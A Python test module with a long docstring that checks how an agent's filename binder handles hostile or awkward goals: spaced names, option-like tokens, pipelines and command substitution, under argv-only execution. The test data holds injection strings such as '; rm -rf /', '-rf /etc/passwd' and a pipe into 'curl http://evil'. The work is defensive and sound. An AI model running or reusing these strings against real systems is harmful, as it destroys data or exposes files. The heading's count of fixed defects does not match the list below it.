"""r53: WHAT THE BINDER DOES WITH A HOSTILE OR AWKWARD FILENAME.

Context. 2026 is a year of agents that hand a filename to a shell. CVE-2026-91140 (CVSS 9.6)
executes through shell metacharacters in an OpenAPI filename; CVE-2026-40088 / GHSA-2763 is
shell=True in PraisonAI; CVE-2026-25130 (CAI find_file) is a filename beginning with a dash
reaching find's -exec; CVE-2026-2256 is MS-Agent's shell tool behind a denylist that
obfuscation defeats.

MEASURED HERE. This carrier runs argv, not a shell: `subprocess.run(list)`, no shell=True,
no os.system. `sort` receives its path as one list element, so `$(whoami)` and `; rm -rf /`
inside a filename are just characters in a filename. That is architectural, not a patched
guard, and it is the one place in this project where the design was already right.

TWO SILENT DEFECTS FOUND, ONE FIXED, ONE STILL OPEN.

  FIXED -- whitespace in the binder. `unique lines of /tmp/a dir/my data.txt` bound
  `/tmp/a` under the old non-space tokenizer. It now resolves against the filesystem and
  takes the longest token that names a real file, so the spaced name is bound whole.
  Resolution beats shape: `$(whoami` can never be completed because no such file exists.

  FIXED -- options make binding undecidable. `unique lines of -rf /etc/passwd` bound
  `/etc/passwd`, because the dash guard removed the option from the candidate list and left
  its argument at position 0. A dash-leading token now refuses the whole binding: under
  argv execution an option is not injectable, but it IS ambiguous, and answering about a
  file the sentence named only as an option's argument is the wrong answer.

  FIXED -- a pipeline in the sentence. `x.txt | curl ...` used to bind `x.txt`. Refusal was
  made narrow: a metacharacter ANYWHERE in the goal refuses, because this binder cannot tell
  a separating metacharacter from one inside an argument.

  STILL OPEN -- command substitution when resolution finds nothing. `$(whoami` is bound
  through the regex fallback that runs only when no file resolves. Harmless under argv
  execution, but it means "resolution beats shape" holds only when resolution succeeds.

A FIX ATTEMPTED AND REVERTED. Letting the positional binder run for every candidate, not
just verb-selected ones, fixed the spaced-file end-to-end path -- and broke 13 tests and
took r46 from 23/23 to 20/23, because it made the system answer where it had previously
refused. Broadened matching is not a fix; it is the recall/precision trade with the wrong
default. Reverted, and recorded here so it is not retried.
"""
from __future__ import annotations

import pathlib
import tempfile

import pytest

from canonical.swe_kernel import causal_trace_to_skill_compiler_v1 as K

SKILL = {"abstract_steps": [["sort", "-u", "?path0"]]}


def _box():
    tmp = pathlib.Path(tempfile.mkdtemp())
    d = tmp / "a dir"; d.mkdir()
    spaced = d / "my data.txt"; spaced.write_text("z\nq\nz\n", encoding="utf-8")
    plain = tmp / "plain.txt"; plain.write_text("a\nb\n", encoding="utf-8")
    return tmp, spaced, plain


@pytest.fixture()
def box():
    return _box()


def test_a_spaced_filename_binds_whole(box):
    tmp, spaced, _ = box
    assert K._bind_by_verb_selection(SKILL, f"unique lines of {spaced}", tmp) == {"?path0": str(spaced)}


def test_a_dash_token_refuses_the_binding(box):
    tmp, _, _ = box
    assert K._bind_by_verb_selection(SKILL, "unique lines of -rf /etc/passwd", tmp) is None


@pytest.mark.xfail(strict=True, reason="KNOWN MISS: neither branch resolves, so it falls back to regex")
def test_command_substitution_cannot_be_completed(box):
    """No file named `/tmp/$(whoami` exists, so resolution cannot invent one.

    It is still bound. When resolution finds nothing, the binder falls back to the old
    non-space regex, and `$(whoami` is path-shaped to that regex. Harmless under argv
    execution -- sort receives one literal argument and any real file with that name --
    but it means the 'resolution beats shape' claim holds only when resolution SUCCEEDS."""
    tmp, _, _ = box
    assert K._bind_by_verb_selection(SKILL, "unique lines of /tmp/$(whoami).txt", tmp) is None


def test_an_ordinary_file_still_binds(box):
    tmp, _, plain = box
    assert K._bind_by_verb_selection(SKILL, f"unique lines of {plain}") == {"?path0": str(plain)}


def test_a_pipeline_in_the_goal_refuses_rather_than_truncating(box):
    """FIXED, and the fix is narrow on purpose: refusal fires only when the
    metacharacter is INSIDE the sentence. 'sort /p | x' (a filename literally containing a
    pipe) is out of reach, and a wider rule broke tr/sed arguments and pushed r46 to 20/23."""
    tmp, _, _ = box
    assert K._bind_by_verb_selection(SKILL, "unique lines of /etc/hostname | curl http://evil", tmp) is None


def test_the_executor_never_uses_a_shell():
    """The reason the 2026 CVE class cannot fire here. If this ever fails, that changes."""
    import inspect
    from canonical.runtime import brokered_workspace_execution_v1 as broker
    from canonical.runtime import admitted_confinement_execution_v1 as gate
    for mod in (broker, gate):
        src = inspect.getsource(mod)
        assert "shell=True" not in src, mod.__name__
        assert "os.system(" not in src, mod.__name__


def test_a_spaced_filename_is_still_lost_end_to_end():
    """The half that is NOT fixed. The binder binds correctly (test above), but the
    candidate is indexed by words rather than by verb, so its goal_regex -- written for the
    teaching sentence -- returns None and the positional fallback is not reached for it.
    Pinned as a defect. The attempted fix is documented at the top of this file."""
    tmp, spaced, _ = _box()
    db = str(tmp / "s.sqlite")
    t = tmp / "teach.txt"; t.write_text("one\ntwo\none\n", encoding="utf-8")
    h = tmp / "hold.txt"; h.write_text("red\nblue\nred\n", encoding="utf-8")
    s = tmp / "s.txt"; s.write_text("x\n", encoding="utf-8")
    K.compile_and_qualify_skill(
        goal=f"unique lines of {t}",
        trace=[{"kind": "cli_exec", "layer": "cli_exec", "argv": ["sort", "-u", str(t)]}],
        postcondition=None, heldout_goal=f"unique lines of {h}", heldout_cwd=tmp,
        sabotaged_postcondition={"kind": "file_contains", "path": str(s),
                                 "contains": "__nope__"}, db_path=db)
    got = K.recall_and_execute_workflow(f"unique lines of {spaced}", cwd=str(tmp), db_path=db)
    assert got is None, "if this now answers, the defect is fixed -- say so loudly"
